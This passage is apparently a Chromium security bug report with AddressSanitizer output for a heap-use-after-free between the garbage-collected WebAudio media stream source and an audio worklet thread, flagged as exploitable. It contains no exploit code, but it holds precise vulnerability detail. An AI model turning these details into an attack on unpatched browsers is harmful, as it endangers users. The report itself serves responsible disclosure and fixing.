    #30 0x5a2d9b145945 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:781:14
    #31 0x5a2d9b148345 in content::ContentMainRunnerImpl::Run() ./../../content/app/content_main_runner_impl.cc:1155:10
    #32 0x5a2d9b14290b in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) ./../../content/app/content_main.cc:359:36
    #33 0x5a2d9b142e2b in content::ContentMain(content::ContentMainParams) ./../../content/app/content_main.cc:372:10
    #34 0x5a2d88d3793f in ChromeMain ./../../chrome/app/chrome_main.cc:222:12
    #35 0x740afb82a1c9 in __libc_init_first ??:?
    #36 0x740afb82a28a in __libc_start_main ??:0:0
    #37 0x5a2d88c5c029 in _start ??:0:0

SUMMARY: AddressSanitizer: heap-use-after-free (/mnt/hdd/projects/fuzzframe/gen/browser/chrome/asan-linux-release-1444497/chrome+0x299bd752) (BuildId: 87a681a21b42e59d)
Shadow bytes around the buggy address:
  0x706aed7ea000: fd fd fd fd fa fa f7 fa fd fd fd fd fd fd fd fd
  0x706aed7ea080: fa fa f7 fa fd fd fd fd fd fd fd fd fa fa f7 fa
  0x706aed7ea100: fd fd fd fd fd fd fd fa fa fa f7 fa fd fd fd fd
  0x706aed7ea180: fd fd fd fd fa fa f7 fa 00 00 00 00 00 00 00 00
  0x706aed7ea200: fa fa f7 fa fd fd fd fd fd fd fd fa fa fa f7 fa
=>0x706aed7ea280: fd fd fd fd fd fd fd fd fa fa f7 fa fd fd[fd]fd
  0x706aed7ea300: fd fd fd fd fa fa f7 fa fd fd fd fd fd fd fd fd
  0x706aed7ea380: fa fa f7 fa fd fd fd fd fd fd fd fd fa fa f7 fa
  0x706aed7ea400: fd fd fd fd fd fd fd fa fa fa f7 fa fd fd fd fd
  0x706aed7ea480: fd fd fd fd fa fa f7 fa fd fd fd fd fd fd fd fd
  0x706aed7ea500: fa fa f7 fa fd fd fd fd fd fd fd fd fa fa f7 fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==4065400==ADDITIONAL INFO

==4065400==Note: Please include this section with the ASan report.
Task trace:
    #0 0x5a2db1c12bf6 in blink::AudioDestination::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:176:34

Command line: `/proc/self/exe --type=renderer --crashpad-handler-pid=4063554 --enable-crash-reporter=, --noerrdialogs --user-data-dir=/mnt/hdd/projects/fuzzframe/gen/profiles/axozvv_g --change-stack-guard-on-fork=enable --no-sandbox --autoplay-policy=no-user-gesture-required --enable-experimental-web-platform-features --enable-blink-test-features --file-url-path-alias=/gen=/mnt/hdd/projects/fuzzframe/gen/browser/chrome/asan-linux-release-1444497/gen --no-zygote --remote-debugging-port=0 --use-cmd-decoder=passthrough --use-fake-ui-for-media-stream --enable-gpu-benchmarking --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=28 --time-ticks-at-unix-epoch=-1744620123386165 --launch-time-ticks=383119095541 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,4833047310778064916,10982801936508415139,262144 --enable-features=BlockInsecurePrivateNetworkRequests,BlockInsecurePrivateNetworkRequestsFromPrivate,BlockInsecurePrivateNetworkRequestsFromUnknown,CookieSameSiteConsidersRedirectChain,CreateImageBitmapOrientationNone,CriticalClientHint,DocumentPictureInPictureAPI,DocumentPolicyIncludeJSCallStacksInCrashReports,DocumentPolicyNegotiation,EnableCanvas2DLayers,ExperimentalContentSecurityPolicyFeatures,OriginIsolationHeader,PartitionedPopins,PrivateNetworkAccessRespectPreflightResults,SchemefulSameSite,StorageAccessHeaders,ThirdPartyStoragePartitioning --disable-features=PaintHolding --variations-seed-version --enable-logging --v=0`

MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==4065400==END OF ADDITIONAL INFO
==4065400==ABORTING


```
#### Reporter credit:

Reporter credit: Huang Xilin of Ant Group Light-Year Security Lab

# Additional Data

Category: Security   

Chrome Channel: Dev   

Regression: N/A

## Timeline

### fe...@gmail.com (2025-04-20)

crash state:

```
==4065400==ERROR: AddressSanitizer: heap-use-after-free on address 0x706aed7ea2f0 at pc 0x5a2da2f06753 bp 0x700a511fcc70 sp 0x700a511fcc68
READ of size 8 at 0x706aed7ea2f0 thread T26 (Semi-Realtime A)
==4065400==WARNING: invalid path to external symbolizer!
==4065400==WARNING: Failed to use and restart external symbolizer!
    #0 0x5a2da2f06752 in media::AudioBus::AllChannelsSubspan(unsigned long, unsigned long) const ./../../media/base/audio_bus.cc:406:24
    #1 0x5a2da2f05d1b in media::AudioBus::CopyPartialFramesTo(int, int, int, media::AudioBus*) const ./../../media/base/audio_bus.cc:370:39
    #2 0x5a2d8bc9b388 in media::AudioPushFifo::Push(media::AudioBus const&) ./../../media/base/audio_push_fifo.cc:60:17
    #3 0x5a2db1bb09eb in blink::WebAudioMediaStreamSource::ConsumeAudio(WTF::Vector<float const*, 0u, WTF::PartitionAllocator> const&, int) ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:78:9
    #4 0x5a2db1bcf4d0 in blink::MediaStreamAudioDestinationHandler::ConsumeAudio(blink::AudioBus*, int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:219:28
    #5 0x5a2db1bced69 in blink::MediaStreamAudioDestinationHandler::Process(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:89:3
    #6 0x5a2db1a86696 in blink::AudioHandler::ProcessIfNecessary(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_handler.cc:325:7
    #7 0x5a2db1b788f3 in blink::DeferredTaskHandler::ProcessAutomaticPullNodes(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc:198:41
    #8 0x5a2db1c0d370 in blink::RealtimeAudioDestinationHandler::Render(blink::AudioBus*, unsigned int, blink::AudioIOPosition const&, blink::AudioCallbackMetric const&, base::TimeDelta, media::AudioGlitchInfo const&) ./../../third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:262:37
    #9 0x5a2db1c1bd0c in blink::AudioDestination::PullFromCallback(blink::AudioBus*, base::TimeDelta) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:672:14
    #10 0x5a2db1c154e0 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks, bool) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:643:7
    #11 0x5a2db1c148ba in blink::AudioDestination::RequestRenderWait(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:559:8
    #12 0x5a2db1c1dcca in Invoke<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks> ./../../base/functional/bind_internal.h:731:12
    #13 0x5a2db1c1dcca in MakeItSo<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), std::__Cr::tuple<scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks> > ./../../base/functional/bind_internal.h:923:12
    #14 0x5a2db1c1dcca in RunImpl<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), std::__Cr::tuple<scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks>, 0UL, 1UL, 2UL, 3UL, 4UL, 5UL, 6UL> ./../../base/functional/bind_internal.h:1060:14
    #15 0x5a2db1c1dcca in base::internal::Invoker<base::internal::FunctorTraits<void (blink::AudioDestination::*&&)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks), scoped_refptr<blink::AudioDestination>&&, unsigned int&&, unsigned int&&, base::TimeDelta&&, base::TimeTicks&&, media::AudioGlitchInfo&&, base::TimeTicks&&>, base::internal::BindState<true, true, false, void (blink::AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks), scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:973:12
    #16 0x5a2d9e3e8da6 in Run ./../../base/functional/callback.h:156:12
    #17 0x5a2d9e3e8da6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:209:34
    #18 0x5a2d9e45a768 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:458:11)> ./../../base/task/common/task_annotator.h:106:5
    #19 0x5a2d9e45a768 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:456:23
    #20 0x5a2d9e45964c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:330:40
    #21 0x5a2d9e45b49a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #22 0x5a2d9e2b4273 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:42:55
    #23 0x5a2d9e45c04b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:629:12
    #24 0x5a2d9e36c9af in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #25 0x5a2d99da7576 in blink::scheduler::NonMainThreadImpl::SimpleThreadImpl::Run() ./../../third_party/blink/renderer/platform/scheduler/worker/non_main_thread_impl.cc:187:14
    #26 0x5a2d9e534b49 in base::(anonymous namespace)::ThreadFunc(void*) ./../../base/threading/platform_thread_posix.cc:103:13
    #27 0x5a2d88cf9b86 in asan_thread_start(void*) _asan_rtl_:28

0x706aed7ea2f0 is located 16 bytes inside of 64-byte region [0x706aed7ea2e0,0x706aed7ea320)
freed by thread T0 (chrome) here:
    #0 0x5a2d88d3688d in operator delete(void*) _asan_rtl_:3
    #1 0x5a2da2f00726 in ~vector ./../../third_party/libc++/src/include/__vector/vector.h:257:67
    #2 0x5a2da2f00726 in media::AudioBus::~AudioBus() ./../../media/base/audio_bus.cc:130:1
    #3 0x5a2da2f00853 in media::AudioBus::~AudioBus() ./../../media/base/audio_bus.cc:126:23
    #4 0x5a2d8bc9ae30 in operator() ./../../third_party/libc++/src/include/__memory/unique_ptr.h:76:5
    #5 0x5a2d8bc9ae30 in reset ./../../third_party/libc++/src/include/__memory/unique_ptr.h:287:7
    #6 0x5a2d8bc9ae30 in ~unique_ptr ./../../third_party/libc++/src/include/__memory/unique_ptr.h:256:71
    #7 0x5a2d8bc9ae30 in media::AudioPushFifo::~AudioPushFifo() ./../../media/base/audio_push_fifo.cc:19:31
    #8 0x5a2db1bb00ba in ~WebAudioMediaStreamSource ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:29:1
    #9 0x5a2db1bb00ba in blink::WebAudioMediaStreamSource::~WebAudioMediaStreamSource() ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:27:57
    #10 0x5a2db1bbd0a5 in operator() ./../../third_party/libc++/src/include/__memory/unique_ptr.h:76:5
    #11 0x5a2db1bbd0a5 in reset ./../../third_party/libc++/src/include/__memory/unique_ptr.h:287:7
    #12 0x5a2db1bbd0a5 in Dispose ./../../third_party/blink/renderer/platform/mediastream/media_stream_source.cc:264:20
    #13 0x5a2db1bbd0a5 in blink::MediaStreamSource::InvokePreFinalizer(cppgc::LivenessBroker const&, void*) ./../../third_party/blink/renderer/platform/mediastream/media_stream_source.h:60:3
    #14 0x5a2d9109b6e9 in operator() ./../../v8/src/heap/cppgc/prefinalizer-handler.cc:71:31
    #15 0x5a2d9109b6e9 in remove_if<std::__Cr::reverse_iterator<std::__Cr::__wrap_iter<cppgc::internal::PreFinalizer *> >, (lambda at ../../v8/src/heap/cppgc/prefinalizer-handler.cc:70:22)> ./../../third_party/libc++/src/include/__algorithm/remove_if.h:32:12
    #16 0x5a2d9109b6e9 in cppgc::internal::PreFinalizerHandler::InvokePreFinalizers() ./../../v8/src/heap/cppgc/prefinalizer-handler.cc:68:7
    #17 0x5a2d910688c7 in cppgc::internal::HeapBase::ExecutePreFinalizers() ./../../v8/src/heap/cppgc/heap-base.cc:169:26
    #18 0x5a2d8efb96e6 in v8::internal::CppHeap::CompactAndSweep() ./../../v8/src/heap/cppgc-js/cpp-heap.cc:990:51
    #19 0x5a2d8f0f1f05 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) ./../../v8/src/heap/heap.cc:2299:32
    #20 0x5a2d8f1416fb in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_0::operator()() const ./../../v8/src/heap/heap.cc:1670:7
    #21 0x5a2d8f140ecc in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_0>(heap::base::Stack*, void*, void const*) ./../../v8/src/heap/base/stack.h:174:5
    #22 0x5a2d910c1c12 in PushAllRegistersAndIterateStack push_registers_asm.cc:0:0
    #23 0x5a2d8f0e59cc in SetMarkerIfNeededAndCallback<(lambda at ../../v8/src/heap/heap.cc:1638:40)> ./../../v8/src/heap/base/stack.h:76:7
    #24 0x5a2d8f0e59cc in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1638:11
    #25 0x5a2d8f0eb2a2 in CollectAllGarbage ./../../v8/src/heap/heap.cc:1269:3
    #26 0x5a2d8f0eb2a2 in v8::internal::Heap::HandleExternalMemoryInterrupt() ./../../v8/src/heap/heap.cc:1436:5
    #27 0x5a2d8f9d372e in CreateExtension ./../../v8/src/objects/js-array-buffer.cc:261:20
    #28 0x5a2d8f9d372e in v8::internal::JSArrayBuffer::Setup(v8::internal::SharedFlag, v8::internal::ResizableFlag, std::__Cr::shared_ptr<v8::internal::BackingStore>, v8::internal::Isolate*) ./../../v8/src/objects/js-array-buffer.cc:119:3
    #29 0x5a2d8f03de0d in v8::internal::Factory::NewJSArrayBuffer(std::__Cr::shared_ptr<v8::internal::BackingStore>, v8::internal::AllocationType) ./../../v8/src/heap/factory.cc:3504:11
    #30 0x5a2d90f06220 in v8::internal::WasmMemoryObject::New(v8::internal::Isolate*, int, int, v8::internal::SharedFlag, v8::internal::wasm::AddressType) ./../../v8/src/wasm/wasm-objects.cc:1000:33
    #31 0x5a2d90ea7dc9 in WebAssemblyMemoryImpl ./../../v8/src/wasm/wasm-js.cc:1632:8
    #32 0x5a2d90ea7dc9 in v8::internal::wasm::WebAssemblyMemory(v8::FunctionCallbackInfo<v8::Value> const&) ./../../v8/src/wasm/wasm-js.cc:3215:1
    #33 0x5a2d8ea4fc02 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool) ./../../v8/src/api/api-arguments-inl.h:93:3
    #34 0x5a2d8ea4df9a in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, unsigned long*, int) ./../../v8/src/builtins/builtins-api.cc:104:16
    #35 0x5a2d8ea4c06f in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:135:3
    #36 0x5a2d92ff2fb5 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc:0:0
    #37 0x5a2d92f48aa4 in Builtins_JSBuiltinsConstructStub setup-isolate-deserialize.cc:0:0
    #24 0x5a2de008dbc4  ([anon:v8]+0x8dbc4)
    #25 0x5a2de0085664  ([anon:v8]+0x85664)
    #40 0x5a2d92f4971b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc:0:0
    #41 0x5a2d92f4946a in Builtins_JSEntry setup-isolate-deserialize.cc:0:0
    #42 0x5a2d8ee48571 in Call ./../../v8/src/execution/simulator.h:212:12
    #43 0x5a2d8ee48571 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:440:22
    #44 0x5a2d8ee46f89 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) ./../../v8/src/execution/execution.cc:530:10

previously allocated by thread T26 (Semi-Realtime A) here:
    #0 0x5a2d88d3602d in operator new(unsigned long) _asan_rtl_:3
    #1 0x5a2da2effb92 in __libcpp_operator_new<unsigned long> ./../../third_party/libc++/src/include/__new/allocate.h:37:10
    #2 0x5a2da2effb92 in __libcpp_allocate<base::span<float, 18446744073709551615UL, float *> > ./../../third_party/libc++/src/include/__new/allocate.h:64:28
    #3 0x5a2da2effb92 in allocate ./../../third_party/libc++/src/include/__memory/allocator.h:105:14
    #4 0x5a2da2effb92 in __allocate_at_least<std::__Cr::allocator<base::span<float, 18446744073709551615UL, float *> > > ./../../third_party/libc++/src/include/__memory/allocate_at_least.h:41:19
    #5 0x5a2da2effb92 in __split_buffer ./../../third_party/libc++/src/include/__split_buffer:325:25
    #6 0x5a2da2effb92 in std::__Cr::vector<base::span<float, 18446744073709551615ul, float*>, std::__Cr::allocator<base::span<float, 18446744073709551615ul, float*>>>::reserve(unsigned long) ./../../third_party/libc++/src/include/__vector/vector.h:1110:49
    #7 0x5a2da2efe575 in media::AudioBus::BuildChannelData(int, base::span<float, 18446744073709551615ul, float*>) ./../../media/base/audio_bus.cc:325:17
    #8 0x5a2da2efddf6 in media::AudioBus::AudioBus(int, int) ./../../media/base/audio_bus.cc:84:3
    #9 0x5a2da2f0089e in media::AudioBus::Create(int, int) ./../../media/base/audio_bus.cc:133:31
    #10 0x5a2d8bc9b244 in media::AudioPushFifo::Push(media::AudioBus const&) ./../../media/base/audio_push_fifo.cc:43:20
    #11 0x5a2db1bb09eb in blink::WebAudioMediaStreamSource::ConsumeAudio(WTF::Vector<float const*, 0u, WTF::PartitionAllocator> const&, int) ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:78:9
    #12 0x5a2db1bcf4d0 in blink::MediaStreamAudioDestinationHandler::ConsumeAudio(blink::AudioBus*, int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:219:28
    #13 0x5a2db1bced69 in blink::MediaStreamAudioDestinationHandler::Process(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:89:3
    #14 0x5a2db1a86696 in blink::AudioHandler::ProcessIfNecessary(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_handler.cc:325:7
    #15 0x5a2db1b788f3 in blink::DeferredTaskHandler::ProcessAutomaticPullNodes(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc:198:41
    #16 0x5a2db1c0d370 in blink::RealtimeAudioDestinationHandler::Render(blink::AudioBus*, unsigned int, blink::AudioIOPosition const&, blink::AudioCallbackMetric const&, base::TimeDelta, media::AudioGlitchInfo const&) ./../../third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:262:37
    #17 0x5a2db1c1bd0c in blink::AudioDestination::PullFromCallback(blink::AudioBus*, base::TimeDelta) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:672:14
    #18 0x5a2db1c154e0 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks, bool) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:643:7
    #19 0x5a2db1c148ba in blink::AudioDestination::RequestRenderWait(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:559:8
    #20 0x5a2db1c1dcca in Invoke<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks> ./../../base/functional/bind_internal.h:731:12
    #21 0x5a2db1c1dcca in MakeItSo<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), std::__Cr::tuple<scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks> > ./../../base/functional/bind_internal.h:923:12
    #22 0x5a2db1c1dcca in RunImpl<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), std::__Cr::tuple<scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks>, 0UL, 1UL, 2UL, 3UL, 4UL, 5UL, 6UL> ./../../base/functional/bind_internal.h:1060:14
    #23 0x5a2db1c1dcca in base::internal::Invoker<base::internal::FunctorTraits<void (blink::AudioDestination::*&&)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks), scoped_refptr<blink::AudioDestination>&&, unsigned int&&, unsigned int&&, base::TimeDelta&&, base::TimeTicks&&, media::AudioGlitchInfo&&, base::TimeTicks&&>, base::internal::BindState<true, true, false, void (blink::AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks), scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:973:12
    #24 0x5a2d9e3e8da6 in Run ./../../base/functional/callback.h:156:12
    #25 0x5a2d9e3e8da6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:209:34
    #26 0x5a2d9e45a768 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:458:11)> ./../../base/task/common/task_annotator.h:106:5
    #27 0x5a2d9e45a768 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:456:23
    #28 0x5a2d9e45964c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:330:40
    #29 0x5a2d9e45b49a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #30 0x5a2d9e2b4273 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:42:55
    #31 0x5a2d9e45c04b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:629:12
    #32 0x5a2d9e36c9af in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #33 0x5a2d99da7576 in blink::scheduler::NonMainThreadImpl::SimpleThreadImpl::Run() ./../../third_party/blink/renderer/platform/scheduler/worker/non_main_thread_impl.cc:187:14
    #34 0x5a2d9e534b49 in base::(anonymous namespace)::ThreadFunc(void*) ./../../base/threading/platform_thread_posix.cc:103:13
    #35 0x5a2d88cf9b86 in asan_thread_start(void*) _asan_rtl_:28

Thread T26 (Semi-Realtime A) created by T0 (chrome) here:
    #0 0x5a2d88ce0381 in ___interceptor_pthread_create _asan_rtl_:3
    #1 0x5a2d9e534138 in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType) ./../../base/threading/platform_thread_posix.cc:151:13
    #2 0x5a2d9e4d8f1c in base::SimpleThread::StartAsync() ./../../base/threading/simple_thread.cc:55:13
    #3 0x5a2d99da4f7a in blink::NonMainThread::CreateThread(blink::ThreadCreationParams const&) ./../../third_party/blink/renderer/platform/scheduler/worker/non_main_thread_impl.cc:41:11
    #4 0x5a2dae30a5da in blink::WorkerBackingThread::WorkerBackingThread(blink::ThreadCreationParams const&) ./../../third_party/blink/renderer/core/workers/worker_backing_thread.cc:125:23
    #5 0x5a2db1c40850 in make_unique<blink::WorkerBackingThread, const blink::ThreadCreationParams &, 0> ./../../third_party/libc++/src/include/__memory/unique_ptr.h:754:30
    #6 0x5a2db1c40850 in blink::WorkletThreadHolder<blink::SemiRealtimeAudioWorkletThread>::EnsureInstance(blink::ThreadCreationParams const&) ./../../third_party/blink/renderer/core/workers/worklet_thread_holder.h:36:9
    #7 0x5a2db1c41a77 in EnsureSharedBackingThread ./../../third_party/blink/renderer/modules/webaudio/semi_realtime_audio_worklet_thread.cc:24:3
    #8 0x5a2db1c41a77 in blink::SemiRealtimeAudioWorkletThread::SemiRealtimeAudioWorkletThread(blink::WorkerReportingProxy&) ./../../third_party/blink/renderer/modules/webaudio/semi_realtime_audio_worklet_thread.cc:53:5
    #9 0x5a2db1b02498 in make_unique<blink::SemiRealtimeAudioWorkletThread, blink::WorkerReportingProxy &, 0> ./../../third_party/libc++/src/include/__memory/unique_ptr.h:754:30
    #10 0x5a2db1b02498 in CreateWorkletThreadWithConstraints ./../../third_party/blink/renderer/modules/webaudio/audio_worklet_messaging_proxy.cc:136:10
    #11 0x5a2db1b02498 in blink::AudioWorkletMessagingProxy::CreateWorkerThread() ./../../third_party/blink/renderer/modules/webaudio/audio_worklet_messaging_proxy.cc:117:10
    #12 0x5a2dae301725 in blink::ThreadedMessagingProxyBase::InitializeWorkerThread(std::__Cr::unique_ptr<blink::GlobalScopeCreationParams, std::__Cr::default_delete<blink::GlobalScopeCreationParams>>, std::__Cr::optional<blink::WorkerBackingThreadStartupData> const&, std::__Cr::optional<base::TokenType<blink::DedicatedWorkerTokenTypeMarker> const> const&, std::__Cr::unique_ptr<blink::WorkerDevToolsParams, std::__Cr::default_delete<blink::WorkerDevToolsParams>>) ./../../third_party/blink/renderer/core/workers/threaded_messaging_proxy_base.cc:77:20
    #13 0x5a2db1b085c8 in blink::ThreadedWorkletMessagingProxy::Initialize(blink::WorkerClients*, blink::WorkletModuleResponsesMap*, std::__Cr::optional<blink::WorkerBackingThreadStartupData> const&, mojo::StructPtr<blink::mojom::blink::WorkletGlobalScopeCreationParams>) ./../../third_party/blink/renderer/core/workers/threaded_worklet_messaging_proxy.cc:161:3
    #14 0x5a2db1aff34d in blink::AudioWorklet::CreateGlobalScope() ./../../third_party/blink/renderer/modules/webaudio/audio_worklet.cc:81:10
    #15 0x5a2dae34ba0f in blink::Worklet::FetchAndInvokeScript(blink::KURL const&, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks*) ./../../third_party/blink/renderer/core/workers/worklet.cc:170:24
    #16 0x5a2dae34c9a9 in Invoke<void (Worklet::*)(const blink::KURL &, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks *), cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL, blink::V8RequestCredentials::Enum, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy> > ./../../base/functional/bind_internal.h:731:12
